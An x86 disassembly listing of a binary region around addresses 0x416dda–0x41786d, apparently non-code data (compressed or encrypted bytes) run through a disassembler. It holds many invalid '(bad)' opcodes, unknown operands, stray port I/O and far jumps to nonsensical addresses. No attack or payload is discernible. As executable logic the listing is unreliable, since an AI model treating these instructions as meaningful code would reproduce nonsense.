  416dda:	adc    eax,0x739401f6
  416ddf:	fistp  DWORD PTR [esi+0x798ebfb4]
  416de5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de6:	push   ebx
  416de7:	cld    
  416de8:	mov    cl,0x17
  416dea:	jne    0x416dde
  416dec:	jae    0x416de2
  416dee:	mov    dl,BYTE PTR ss:[eax-0x249beb1e]
  416df5:	or     ebx,DWORD PTR [eax]
  416df7:	shl    cl,1
  416df9:	mov    ah,0x7d
  416dfb:	out    0xe3,eax
  416dfd:	mov    WORD PTR [esi],?
  416dff:	cmp    al,0xc5
  416e01:	pop    edx
  416e02:	jne    0x416e1b
  416e04:	push   0xffffff8d
  416e06:	or     edi,DWORD PTR [ebx-0x16]
  416e09:	mov    ?,WORD PTR [ebp+0x778d4600]
  416e0f:	scas   eax,DWORD PTR es:[edi]
  416e10:	lods   al,BYTE PTR ds:[esi]
  416e11:	in     eax,dx
  416e12:	addr16 enter 0x9144,0xdd
  416e17:	xchg   DWORD PTR [ecx+0x7a22c2ac],edx
  416e1d:	dec    edi
  416e1e:	pop    ebp
  416e1f:	ins    DWORD PTR es:[edi],dx
  416e20:	jae    0x416e4e
  416e22:	sbb    BYTE PTR [ecx],ch
  416e24:	pop    esp
  416e25:	cmp    cl,BYTE PTR [ebp-0x3a]
  416e28:	(bad)  
  416e2a:	nop
  416e2b:	lods   eax,DWORD PTR ds:[esi]
  416e2c:	push   edx
  416e2d:	fnstenv [ebx+eiz*4-0x30]
  416e31:	nop
  416e32:	mov    edx,0x7254f6cd
  416e37:	fist   WORD PTR [esi+edx*2-0xe2b4484]
  416e3e:	pop    edi
  416e3f:	dec    ebp
  416e40:	retf   
  416e41:	pop    ebp
  416e42:	jbe    0x416de6
  416e44:	jbe    0x416de0
  416e46:	mov    dh,0x18
  416e48:	mul    BYTE PTR [ebp+0x6b]
  416e4b:	scas   eax,DWORD PTR es:[edi]
  416e4c:	loopne 0x416e17
  416e4e:	jb     0x416e2f
  416e50:	fcom   QWORD PTR [esi+0x1860dfa7]
  416e56:	std    
  416e57:	xchg   ebx,eax
  416e58:	sbb    ebp,eax
  416e5a:	fcmovnu st,st(0)
  416e5c:	dec    esi
  416e5d:	repz mov eax,ds:0x5ab8c017
  416e63:	mov    cl,0xcd
  416e65:	cmp    ecx,DWORD PTR [edx-0x6f]
  416e68:	mov    al,BYTE PTR [edi-0x36dbcd5a]
  416e6e:	jbe    0x416e83
  416e70:	or     BYTE PTR [eax],0x8e
  416e73:	jbe    0x416dfe
  416e75:	sbb    bl,al
  416e77:	sbb    ah,dl
  416e79:	xor    eax,0xd4f3a635
  416e7e:	loop   0x416e42
  416e80:	cmc    
  416e81:	(bad)  
  416e82:	sbb    BYTE PTR [ebx+ebx*8],dh
  416e85:	fstp   DWORD PTR [ebp+0x37b3a4d]
  416e8b:	cmp    BYTE PTR [ecx-0x2],ah
  416e8e:	cmc    
  416e8f:	add    al,0x0
	...
  416ef1:	add    BYTE PTR [eax],al
  416ef3:	add    BYTE PTR [edi-0x519271e7],bh
  416ef9:	(bad)  
  416efa:	(bad)  
  416efb:	fucomi st,st(0)
  416efd:	xor    eax,0x1f18eea
  416f02:	fcom   QWORD PTR [esp+ebx*2+0x40000f2]
  416f09:	add    DWORD PTR [eax],eax
  416f0b:	add    BYTE PTR [esp+eax*4],dl
  416f0e:	int3   
  416f0f:	inc    ecx
  416f10:	jno    0x416f3f
  416f12:	push   es
  416f13:	inc    edx
  416f14:	and    esi,esp
  416f16:	fstp   QWORD PTR [ebx+0x2b39e686]
  416f1c:	ret    0xa8c3
  416f1f:	int3   
  416f20:	(bad)  [esp+ebx*1-0x6d8aab29]
  416f27:	jp     0x416f36
  416f29:	and    cl,ah
  416f2b:	mov    ch,cl
  416f2d:	mov    edx,0xdf0f6ecf
  416f32:	adc    BYTE PTR [esi+0x6f],ch
  416f35:	or     eax,0xf67091cb
  416f3a:	outs   dx,DWORD PTR ds:[esi]
  416f3b:	push   0x2e
  416f3d:	jmp    0x80bed2e8
  416f42:	cdq    
  416f43:	sahf   
  416f44:	loope  0x416eda
  416f46:	xchg   esi,eax
  416f47:	xor    DWORD PTR [eax-0xc],esp
  416f4a:	push   es
  416f4b:	sub    eax,0xcdfdd47f
  416f50:	mov    dh,0x57
  416f52:	mov    bl,dl
  416f54:	or     eax,DWORD PTR ds:0xda7ff261
  416f5a:	push   edi
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	or     BYTE PTR [ebx-0x6c],dl
  416f60:	mov    ds:0xb03baf0a,eax
  416f65:	es (bad) 
  416f67:	pop    eax
  416f68:	retf   0xfd93
  416f6b:	loop   0x416f54
  416f6d:	mov    eax,ds:0xc49743f7
  416f72:	std    
  416f73:	stc    
  416f74:	xor    BYTE PTR [ebp-0x36],al
  416f77:	arpl   WORD PTR [eax],sp
  416f79:	xchg   ebp,eax
  416f7a:	push   edi
  416f7b:	std    
  416f7c:	in     al,dx
  416f7d:	not    DWORD PTR [ecx+0x1e81fadd]
  416f83:	in     eax,dx
  416f84:	mov    esi,0x29ac1dc3
  416f89:	add    eax,0x3d12c364
  416f8e:	xchg   BYTE PTR [edi-0x28],ch
  416f91:	aam    0x5
  416f93:	fs xchg esi,eax
  416f95:	mov    ch,0xe0
  416f97:	sbb    al,0xf7
  416f99:	retf   
  416f9a:	sbb    ebx,ecx
  416f9c:	inc    esi
  416f9d:	call   0x8ac9efe
  416fa2:	out    0x4a,eax
  416fa4:	pop    ebp
  416fa5:	add    al,0xc7
  416fa7:	fist   DWORD PTR [ecx-0x79]
  416faa:	popa   
  416fab:	adc    eax,DWORD PTR [ebx-0x5c472af7]
  416fb1:	dec    ebx
  416fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fb3:	pop    ebp
  416fb4:	dec    edi
  416fb5:	mov    eax,ds:0xfde00ea7
  416fba:	idiv   DWORD PTR [edx]
  416fbc:	scas   eax,DWORD PTR es:[edi]
  416fbd:	dec    edx
  416fbe:	inc    esp
  416fbf:	leave  
  416fc0:	fisttp QWORD PTR [eax-0x11549229]
  416fc6:	sub    eax,0x3ec03f61
  416fcb:	jg     0x416ffc
  416fcd:	pop    ebx
  416fce:	repnz rcr BYTE PTR [eax],1
  416fd1:	jmp    0x416fa9
  416fd3:	inc    esp
  416fd4:	es fdivrp st(0),st
  416fd7:	(bad)  [ecx+0x1a]
  416fda:	mov    ebx,0x20bafe16
  416fdf:	aad    0x3
  416fe1:	and    DWORD PTR [esi],0x1755b1d2
  416fe7:	ins    DWORD PTR es:[edi],dx
  416fe8:	rcr    BYTE PTR [ecx-0x74],cl
  416feb:	rcl    DWORD PTR [ebx],1
  416fed:	push   esi
  416fee:	sub    esi,DWORD PTR [ebp+0x5c568ae]
  416ff4:	je     0x417050
  416ff6:	mov    dh,0xd0
  416ff8:	mov    ebx,0xc185fc2c
  416ffd:	dec    edx
  416ffe:	push   es
  416fff:	xor    DWORD PTR [eax],eax
  417001:	mov    ecx,0x92a069ec
  417006:	mov    edi,0xe7f4a124
  41700b:	pop    ss
  41700c:	ret    0xcd3d
  41700f:	fadd   DWORD PTR [eax]
	...
  417071:	add    BYTE PTR [eax],al
  417073:	add    BYTE PTR [esi+0x2d],dh
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    edi,DWORD PTR [eax-0x66]
  417082:	inc    ebx
  417083:	enter  0xf360,0x0
  417087:	add    BYTE PTR [ecx+eax*1],al
  41708a:	add    BYTE PTR [eax],al
  41708c:	mov    al,ds:0x5a1b949a
  417091:	xchg   DWORD PTR [esi+0x462d417a],ecx
  417097:	push   esi
  417098:	xchg   BYTE PTR [ebx],ch
  41709a:	mov    BYTE PTR [esi+0x32],dh
  41709d:	clc    
  41709e:	mov    eax,ds:0x77acdf10
  4170a3:	dec    esi
  4170a4:	iret   
  4170a5:	ds push ebp
  4170a7:	daa    
  4170a8:	sbb    DWORD PTR [eax-0xd],0x9
  4170ac:	add    al,0x58
  4170ae:	inc    edx
  4170af:	adc    BYTE PTR [eax+0x26],ch
  4170b2:	adc    DWORD PTR [ebp+0x6f],edi
  4170b5:	pop    esp
  4170b6:	fwait
  4170b7:	sbb    BYTE PTR [edi+eax*1],0xf3
  4170bb:	retf   0x1163
  4170be:	outs   dx,BYTE PTR ds:[esi]
  4170bf:	push   edi
  4170c0:	test   BYTE PTR [esi+0x2d],0xdf
  4170c4:	fst    st(4)
  4170c6:	mov    dh,0xaf
  4170c8:	cld    
  4170c9:	xlat   BYTE PTR es:[ebx]
  4170cb:	mov    esp,0x3a602e1c
  4170d0:	lock in al,0x7e
  4170d3:	scas   al,BYTE PTR es:[edi]
  4170d4:	push   ds
  4170d5:	push   ecx
  4170d6:	loop   0x41709c
  4170d8:	inc    bh
  4170da:	add    dh,ah
  4170dc:	inc    eax
  4170dd:	mov    al,0x60
  4170df:	(bad)
  4170e2:	mov    DWORD PTR [esi+ebx*4-0x3c2c6840],ebx
  4170e9:	cmp    BYTE PTR [ebp+0x56980ebd],0x30
  4170f0:	shl    esi,cl
  4170f2:	adc    al,0xc4
  4170f4:	add    al,0x42
  4170f6:	fstp   TBYTE PTR ds:0x6d334d52
  4170fc:	nop
  4170fd:	mov    al,ds:0x2a08a788
  417102:	mov    al,ds:0x20b6f20b
  417107:	lods   al,BYTE PTR ds:[esi]
  417108:	or     eax,0xd62c113b
  41710d:	jnp    0x417177
  41710f:	xor    eax,edi
  417111:	out    dx,eax
  417112:	jecxz  0x417138
  417114:	push   es
  417115:	les    edi,FWORD PTR [ecx+0x258c81e]
  41711b:	adc    DWORD PTR [ebp-0x732b486],ebp
  417121:	test   ebx,ecx
  417123:	dec    ebx
  417124:	fxch   st(3)
  417126:	jmp    0x6d24:0xf645ce4
  41712d:	in     eax,dx
  41712e:	jle    0x417141
  417130:	jbe    0x417199
  417132:	sbb    ch,BYTE PTR fs:[esp+ecx*8]
  417136:	cs aad 0xf5
  417139:	sbb    ah,BYTE PTR [eax-0x44]
  41713c:	sbb    bl,BYTE PTR [edi-0x6]
  41713f:	pushf  
  417140:	xor    BYTE PTR [edi-0x42],bl
  417143:	popf   
  417144:	mov    dl,0x50
  417146:	ss retf 0x4fdd
  41714a:	stos   BYTE PTR es:[edi],al
  41714b:	pop    edi
  41714c:	ror    edi,cl
  41714e:	mov    ?,WORD PTR [esi]
  417150:	test   BYTE PTR [ebx-0x11e221f4],bl
  417156:	(bad)  
  417157:	iret   
  417158:	mov    WORD PTR gs:[esi+eiz*4],ds
  41715c:	std    
  41715d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41715e:	lea    edx,[ebp-0x29]
  417161:	jg     0x41718d
  417163:	loopne 0x4171c3
  417165:	(bad)  
  417167:	pop    esp
  417168:	(bad)  [ebx-0x5fe4c91]
  41716e:	jb     0x4171ea
  417170:	xchg   edx,eax
  417171:	in     al,0xe2
  417173:	mov    ah,0xb4
  417175:	jmp    0x417171
  417177:	fs push es
  417179:	dec    edx
  41717a:	sub    DWORD PTR [edi],ecx
  41717c:	jns    0x41711c
  41717e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41717f:	sbb    al,dh
  417181:	or     BYTE PTR [ebp+0x4c04c2e5],ch
  417187:	pushf  
  417188:	outs   dx,BYTE PTR ds:[esi]
  417189:	retf   0x4420
  41718c:	sbb    eax,0x15bc96
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	sbb    al,dl
  417202:	sti    
  417203:	pop    ebp
  417204:	fs hlt 
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	mov    esi,0x394e3bd2
  417211:	xor    edi,DWORD PTR [eax]
  417213:	cmp    esp,DWORD PTR [ebx]
  417215:	pusha  
  417216:	lods   al,BYTE PTR ds:[esi]
  417217:	fistp  QWORD PTR [edx-0x114f3be8]
  41721d:	fwait
  41721e:	xchg   ebx,eax
  41721f:	jbe    0x417229
  417221:	repz lea eax,[ebp+0x45dbc8c4]
  417228:	xchg   DWORD PTR [esi-0x22],ecx
  41722b:	cmp    DWORD PTR [esi-0x4721d653],ecx
  417231:	mov    dh,0xf9
  417233:	int    0xe5
  417235:	in     eax,0x2c
  417237:	xchg   DWORD PTR [ebx-0x11083592],esp
  41723d:	loopne 0x417259
  41723f:	inc    ecx
  417240:	call   0x691:0x27551c1
  417247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417248:	adc    DWORD PTR [ecx],esi
  41724a:	je     0x41725d
  41724c:	es sbb al,0x29
  41724f:	or     BYTE PTR [edx+edi*2],dh
  417252:	icebp  
  417253:	scas   eax,DWORD PTR es:[edi]
  417254:	mov    ?,ecx
  417256:	daa    
  417257:	in     eax,0x96
  417259:	div    DWORD PTR [esi+0x7f]
  41725c:	xchg   ebp,eax
  41725d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41725f:	and    DWORD PTR [esp+esi*4],esi
  417262:	fidivr DWORD PTR ds:0x4218c3fc
  417268:	cmp    DWORD PTR [edx-0x212c8033],edx
  41726e:	jnp    0x41721b
  417270:	test   al,0x9a
  417273:	ds pop edi
  417275:	lock div BYTE PTR [edi-0x3c]
  417279:	pop    ecx
  41727a:	lods   eax,DWORD PTR ds:[esi]
  41727b:	fld    QWORD PTR [esi+0x1f23ab5e]
  417281:	jge    0x41722c
  417283:	add    edx,DWORD PTR [ecx]
  417285:	mov    ds:0xf47246fe,al
  41728a:	xor    ebp,eax
  41728c:	and    al,0xde
  41728e:	push   0x69
  417290:	fadd   QWORD PTR [ebx-0x6baf823]
  417296:	fld    TBYTE PTR [eax-0x73]
  417299:	pushf  
  41729a:	vpmuludq xmm2,xmm3,XMMWORD PTR [edi+0xc3e7c8b]
  4172a2:	dec    edi
  4172a3:	out    0x63,al
  4172a5:	dec    ecx
  4172a6:	cmp    al,0xe7
  4172a8:	loope  0x41725e
  4172aa:	in     al,dx
  4172ab:	jle    0x41731d
  4172ad:	retf   
  4172ae:	shr    DWORD PTR [ebp+0x8],0x99
  4172b2:	sbb    BYTE PTR [ecx+edi*4],0x94
  4172b6:	dec    ebx
  4172b7:	sub    al,0x50
  4172b9:	cmp    eax,0xd57c44e3
  4172be:	in     al,dx
  4172bf:	out    0xab,al
  4172c1:	xchg   edi,eax
  4172c2:	int3   
  4172c3:	icebp  
  4172c4:	ret    
  4172c5:	push   esi
  4172c6:	popa   
  4172c7:	(bad)  
  4172c8:	mov    ?,WORD PTR [esi+0x0]
  4172cb:	jns    0x41726a
  4172cd:	call   0x8364169a
  4172d2:	sbb    al,0x6
  4172d4:	ss aad 0xf0
  4172d7:	add    ah,BYTE PTR [esi-0x46036d9f]
  4172dd:	mov    ch,0x26
  4172df:	in     al,0xcd
  4172e1:	jmp    0xc3edc7cc
  4172e6:	xchg   ebp,eax
  4172e7:	push   ss
  4172e8:	in     eax,0x49
  4172ea:	stc    
  4172eb:	push   esi
  4172ec:	push   ebp
  4172ed:	jo     0x417313
  4172ef:	sbb    eax,0x9be671f6
  4172f4:	sbb    BYTE PTR [esi],bh
  4172f6:	cvtdq2ps xmm7,XMMWORD PTR [esi]
  4172f9:	lods   eax,DWORD PTR ds:[esi]
  4172fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172fb:	sub    BYTE PTR [eax-0x17],dh
  4172fe:	lahf   
  4172ff:	leave  
  417300:	or     bl,BYTE PTR [eax-0x7b]
  417303:	mov    eax,0xe60c4fba
  417308:	jmp    0x411127
  41730d:	jb     0x4172b9
  41730f:	outs   dx,DWORD PTR ds:[esi]
	...
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	gs push ds
  417381:	pop    ebx
  417382:	rcl    DWORD PTR [eax+ebp*2],1
  417385:	cmc    
  417386:	add    BYTE PTR [eax],al
  417388:	add    al,0x1
  41738a:	add    BYTE PTR [eax],al
  41738c:	xlat   BYTE PTR ds:[ebx]
  41738d:	test   DWORD PTR ds:0xd1cce87a,0x152cd428
  417397:	sub    ecx,DWORD PTR [esi+0x0]
  41739a:	add    eax,0x7e1d93fc
  41739f:	xlat   BYTE PTR ds:[ebx]
  4173a0:	jae    0x4173a3
  4173a2:	addr16 mov esp,?
  4173a5:	sbb    DWORD PTR [ebp+0x27],esi
  4173a8:	sub    al,BYTE PTR [ebp-0x21]
  4173ab:	or     BYTE PTR [edi-0x8bad9bd],cl
  4173b1:	dec    ecx
  4173b2:	mov    al,ds:0x2dc923a0
  4173b7:	aam    0xaf
  4173b9:	arpl   bp,dx
  4173bb:	cmc    
  4173bc:	sub    ebx,ebx
  4173be:	mov    edx,eax
  4173c0:	sahf   
  4173c1:	sar    BYTE PTR [edi+esi*4-0x24176cf5],cl
  4173c8:	and    ah,ch
  4173ca:	ins    BYTE PTR es:[edi],dx
  4173cb:	mov    al,ch
  4173cd:	ss pushf 
  4173cf:	dec    ebp
  4173d0:	jp     0x4173eb
  4173d2:	cmc    
  4173d3:	mov    esi,0x60e710cb
  4173d8:	pusha  
  4173d9:	adc    DWORD PTR [eax],edx
  4173db:	cmc    
  4173dc:	mov    ebp,DWORD PTR [edx]
  4173de:	rcr    edi,cl
  4173e0:	imul   DWORD PTR [ecx+edx*8-0x758136d2]
  4173e7:	inc    edx
  4173e8:	and    ecx,esi
  4173ea:	pusha  
  4173eb:	rol    bh,0x9f
  4173ee:	inc    ecx
  4173ef:	jge    0x41743c
  4173f1:	sub    bl,al
  4173f3:	jmp    0x621e1f36
  4173f8:	or     ch,BYTE PTR [ecx-0x19]
  4173fb:	xchg   DWORD PTR [esi+ebx*4],ecx
  4173fe:	daa    
  4173ff:	imul   ebx,DWORD PTR [edi+ebp*1-0xa],0x3f
  417404:	cmp    eax,0xacfebb9
  417409:	nop
  41740a:	mov    ah,0xa8
  41740c:	or     ecx,DWORD PTR [eax-0x72269963]
  417412:	jg     0x417484
  417414:	(bad)  [ebx]
  417416:	push   cs
  417417:	dec    esp
  417418:	mov    ah,0xcc
  41741a:	pop    edx
  41741b:	xchg   ebp,eax
  41741c:	cwde   
  41741d:	in     al,dx
  41741e:	add    DWORD PTR [ebp-0x60c6415a],edi
  417424:	aas    
  417425:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417426:	repnz sbb eax,DWORD PTR [eax+0x9f7ff3]
  41742d:	imul   BYTE PTR [edi+0x76]
  417430:	ins    DWORD PTR es:[edi],dx
  417431:	hlt    
  417432:	add    DWORD PTR [ecx+ebp*8],ebp
  417435:	fcomp  st(6)
  417437:	push   esp
  417438:	call   0x476c8b66
  41743d:	mov    ch,0xf2
  41743f:	out    dx,eax
  417440:	call   0x2e1d:0x50828636
  417447:	sub    eax,0x99222a29
  41744c:	and    al,0x94
  41744e:	loop   0x4173db
  417450:	out    0x6c,eax
  417452:	(bad)  
  417453:	jmp    0x4c36853
  417458:	ja     0x4174bf
  41745a:	fisub  WORD PTR [ecx-0x420d684c]
  417460:	ret    0xccb5
  417463:	mov    DWORD PTR [eax+0x69],esp
  417466:	pusha  
  417467:	mov    ds:0xb2fdae69,eax
  41746c:	cmp    ch,dl
  41746e:	fmul   DWORD PTR [edx-0x15]
  417471:	shr    eax,1
  417473:	inc    ebp
  417474:	test   eax,0x825d425e
  417479:	into   
  41747a:	and    BYTE PTR [edx+0x39dac797],ah
  417480:	inc    edx
  417481:	mov    cl,0x90
  417483:	(bad)  
  417485:	or     BYTE PTR [esi+0x10db35c9],bh
  41748b:	sub    al,0xe1
  41748d:	fcom   st(0)
  41748f:	jb     0x417491
	...
  4174f1:	add    BYTE PTR [eax],al
  4174f3:	add    BYTE PTR [ecx+0x6b0c6aba],dl
  4174f9:	fdivr  st(7),st
  4174fb:	mov    edi,0x212a686b
  417500:	sar    DWORD PTR [esi],cl
  417502:	bound  ebp,QWORD PTR [edi+0xf66c]
  417508:	add    al,0x1
  41750a:	add    BYTE PTR [eax],al
  41750c:	cmc    
  41750d:	xchg   ecx,eax
  41750e:	jmp    0x7722cd45
  417513:	mov    ds:0x5fcdff5,al
  417518:	ds xor eax,0x918ecb5
  41751e:	mov    esp,0x832e7d95
  417523:	jno    0x4174b4
  417525:	mov    edx,0xcc70e438
  41752a:	and    esi,ebp
  41752c:	test   DWORD PTR [ecx-0x1b],0x992926ef
  417533:	push   es
  417534:	push   0xffffffae
  417536:	xchg   esi,eax
  417537:	xor    ebp,DWORD PTR [ecx]
  417539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41753a:	icebp  
  41753b:	push   ds
  41753c:	outs   dx,BYTE PTR ds:[esi]
  41753d:	xchg   ecx,eax
  41753e:	(bad)  
  41753f:	sub    eax,0xd99cc0f2
  417544:	inc    edi
  417545:	daa    
  417546:	adc    ebx,DWORD PTR [ebx*4+0x63b8b50c]
  41754d:	xchg   ebp,eax
  41754e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41754f:	in     al,0x24
  417551:	and    BYTE PTR [edx+0x21],al
  417554:	out    0xc5,ax
  417557:	jmp    0x417572
  417559:	int3   
  41755a:	das    
  41755b:	bound  ebx,QWORD PTR [edi+edi*8]
  41755e:	mov    BYTE PTR [ebx-0x719b7f67],dl
  417564:	xor    dl,al
  417566:	xchg   BYTE PTR [ecx+0x25],ah
  417569:	add    DWORD PTR [ecx+0x3fc9c30a],edx
  41756f:	ss clc 
  417571:	sar    esi,1
  417573:	scas   al,BYTE PTR es:[edi]
  417574:	imul   edi,DWORD PTR [ebx+0xd],0x4e83a16c
  41757b:	js     0x4175e6
  41757d:	sub    DWORD PTR [edx+0x27],eax
  417580:	(bad)  
  417581:	inc    ebx
  417582:	stc    
  417583:	adc    eax,0xca7036f4
  417588:	cwde   
  417589:	xchg   ebp,eax
  41758a:	mov    ebx,0xffa5cca7
  41758f:	jle    0x417523
  417591:	mov    ss,WORD PTR [esi-0x5b0631bc]
  417597:	xchg   dh,ch
  417599:	gs gs jecxz 0x4175e7
  41759d:	sub    DWORD PTR [ebp-0x79bcd980],esp
  4175a3:	addr16 test dl,bh
  4175a6:	test   eax,0x4217967d
  4175ab:	cmc    
  4175ac:	js     0x41759d
  4175ae:	jl     0x417580
  4175b0:	adc    eax,0x95e08931
  4175b5:	sub    edx,DWORD PTR [eax]
  4175b7:	dec    eax
  4175b8:	mov    ebx,0xeca3b4a8
  4175bd:	cwde   
  4175be:	or     eax,0x2b21dd49
  4175c3:	mov    ch,al
  4175c5:	push   esp
  4175c6:	imul   ebx,DWORD PTR [edi-0x2ded932e],0x2
  4175cd:	pop    es
  4175ce:	ja     0x417562
  4175d0:	sbb    edx,eax
  4175d2:	je     0x417556
  4175d4:	or     ecx,DWORD PTR [edx-0x1861d312]
  4175da:	test   BYTE PTR [edi-0x3b35acee],0x73
  4175e1:	xor    DWORD PTR [esi+eax*1],0xfc189a19
  4175e8:	lods   al,BYTE PTR ds:[esi]
  4175e9:	inc    ebp
  4175ea:	lahf   
  4175eb:	pushf  
  4175ec:	jp     0x417591
  4175ee:	sub    eax,0x1feac1ab
  4175f3:	scas   al,BYTE PTR es:[edi]
  4175f4:	adc    cl,BYTE PTR ds:0xb716429e
  4175fa:	inc    edx
  4175fb:	mov    edx,0x65b281fe
  417600:	(bad)  
  417601:	push   edi
  417602:	mov    dh,0x29
  417604:	gs int 0xe7
  417607:	or     eax,0xa10a2b62
  41760c:	fstp   DWORD PTR [ebx]
  41760e:	jno    0x417616
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	ficom  DWORD PTR ds:0x703d9c7d
  417685:	test   DWORD PTR [eax],0x10400
  41768b:	add    BYTE PTR [eax],dh
  41768d:	mov    ah,0x11
  41768f:	inc    ebx
  417690:	retf   
  417691:	jns    0x417640
  417693:	and    eax,DWORD PTR [edx+0x3c]
  417696:	call   0xe3064c9b
  41769b:	inc    esp
  41769c:	pop    esp
  41769d:	mov    esi,0xaf871787
  4176a2:	xchg   ebp,eax
  4176a3:	adc    BYTE PTR [esi+0x2e],0x1f
  4176a7:	stos   DWORD PTR es:[edi],eax
  4176a8:	aad    0xf2
  4176aa:	stos   DWORD PTR es:[edi],eax
  4176ab:	add    al,0xe9
  4176ad:	(bad)  
  4176ae:	pusha  
  4176af:	mov    ah,0x51
  4176b1:	inc    ebx
  4176b2:	(bad)  
  4176b4:	dec    eax
  4176b5:	sbb    eax,0xa08c8bae
  4176ba:	dec    edx
  4176bb:	sbb    BYTE PTR [edx-0x3002f5b4],0x6a
  4176c2:	sbb    bh,BYTE PTR [eax]
  4176c4:	inc    edi
  4176c5:	repz dec ebx
  4176c7:	push   ebx
  4176c8:	lods   al,BYTE PTR ds:[esi]
  4176c9:	mov    edi,0xcdad022e
  4176ce:	test   al,0x55
  4176d0:	cmp    al,0xd3
  4176d2:	cs xor al,0x79
  4176d5:	and    BYTE PTR [ebx+ebx*8+0x2d],0x42
  4176da:	push   ecx
  4176db:	repnz inc ecx
  4176dd:	jo     0x4176b6
  4176df:	nop
  4176e0:	jmp    0xc4b11762
  4176e5:	dec    eax
  4176e6:	ret    
  4176e7:	into   
  4176e8:	add    al,0xd0
  4176ea:	pop    edx
  4176eb:	retf   
  4176ec:	cmp    eax,0xa5787d4f
  4176f1:	mov    dl,0x87
  4176f3:	push   DWORD PTR [ebx-0x44f05823]
  4176f9:	sbb    al,0x17
  4176fb:	cmp    al,BYTE PTR [ebx]
  4176fd:	pop    ebx
  4176fe:	rol    BYTE PTR [ecx],0x7e
  417701:	ss hlt 
  417703:	enter  0x1dc8,0xbc
  417707:	xor    DWORD PTR [ecx],0x5a
  41770a:	inc    edi
  41770b:	fidiv  WORD PTR [ecx]
  41770d:	loop   0x41778c
  41770f:	lea    ebx,[eax-0x54]
  417712:	inc    edx
  417713:	(bad)  
  417714:	jecxz  0x417759
  417716:	dec    edx
  417717:	add    ebx,DWORD PTR [esi]
  417719:	push   cs
  41771a:	and    edi,DWORD PTR [esi+0x2d1cbbee]
  417720:	clc    
  417721:	mov    WORD PTR [ebp-0x832bb77],?
  417727:	fwait
  417728:	xchg   ecx,esp
  41772a:	xchg   al,ah
  41772c:	mov    ch,0x2d
  41772e:	daa    
  41772f:	mul    BYTE PTR [esi+0x3da8f25f]
  417735:	leave  
  417736:	xchg   edx,eax
  417737:	pop    edx
  417738:	and    edi,DWORD PTR [eax+ebp*1-0x1f]
  41773c:	in     eax,0x6
  41773e:	push   0x4c
  417740:	in     eax,0xbb
  417742:	adc    al,0x81
  417744:	les    edx,FWORD PTR [eax-0x483e7f92]
  41774a:	test   BYTE PTR [edx+0x1b],0x83
  41774e:	aad    0x79
  417750:	popf   
  417751:	outs   dx,DWORD PTR ds:[esi]
  417752:	jae    0x4176f0
  417754:	inc    ebp
  417755:	push   0x92627069
  41775a:	xor    al,BYTE PTR [eax+edx*2]
  41775d:	pusha  
  41775e:	push   esp
  41775f:	addr16 call 0x94a067e6
  417765:	outs   dx,BYTE PTR ds:[esi]
  417766:	push   ebx
  417767:	fcmovb st,st(6)
  417769:	aam    0x7b
  41776b:	lods   al,BYTE PTR ds:[esi]
  41776c:	jmp    0xbd5f2d73
  417771:	jp     0x417721
  417773:	out    0xdf,eax
  417775:	cs mov ebx,0x52757961
  41777b:	push   0xf8ce640d
  417780:	xlat   BYTE PTR ds:[ebx]
  417781:	les    esp,FWORD PTR [edx+0x5d49f44e]
  417787:	ins    BYTE PTR es:[edi],dx
  417788:	and    DWORD PTR [eax+0x67ddf958],edx
  41778e:	xchg   BYTE PTR [eax+eax*1+0x0],cl
	...
  4177f2:	add    BYTE PTR [eax],al
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	(bad)  
  417801:	dec    edx
  417802:	push   ecx
  417803:	shl    BYTE PTR [eax+edi*8+0x0],cl
  417807:	add    BYTE PTR [ecx+eax*1],al
  41780a:	add    BYTE PTR [eax],al
  41780c:	cdq    
  41780d:	shr    bl,0x22
  417810:	or     ecx,DWORD PTR [eax+ebp*8]
  417813:	mov    edx,0xd363b773
  417818:	popa   
  417819:	mov    ds:0xcb3b0ffa,eax
  41781e:	lods   ax,WORD PTR ds:[esi]
  417820:	cmp    al,0xf6
  417822:	jg     0x4177e3
  417824:	mov    dh,0x58
  417826:	cdq    
  417827:	jp     0x417853
  417829:	add    BYTE PTR [esp],0x22
  41782d:	retf   
  41782e:	xor    al,0x9a
  417830:	add    al,0xa9
  417832:	push   ecx
  417833:	fadd   QWORD PTR [eax-0x34]
  417836:	in     al,0x60
  417838:	pop    ds
  417839:	push   cs
  41783a:	push   ss
  41783b:	pop    ebp
  41783c:	loope  0x4177d5
  41783e:	in     eax,0x22
  417840:	mov    DWORD PTR [esi+0x61],ebp
  417843:	inc    eax
  417844:	fwait
  417845:	je     0x41780f
  417847:	(bad)  
  41784a:	xchg   ebp,eax
  41784b:	hlt    
  41784c:	or     edx,0xa853a560
  417852:	es ds mov eax,0x3394ef83
  417859:	pop    ebp
  41785a:	mov    bh,0x7b
  41785c:	or     al,0x7d
  41785e:	outs   dx,BYTE PTR ds:[esi]
  41785f:	dec    ebx
  417860:	sbb    BYTE PTR [ebp+0x4a4dc3d2],dh
  417866:	ja     0x4177f7
  417868:	(bad)  
  417869:	mov    esi,DWORD PTR [eax+0x74]
  41786c:	push   ecx
  41786d:	or     bh,BYTE PTR [ecx+0x574a1fe4]
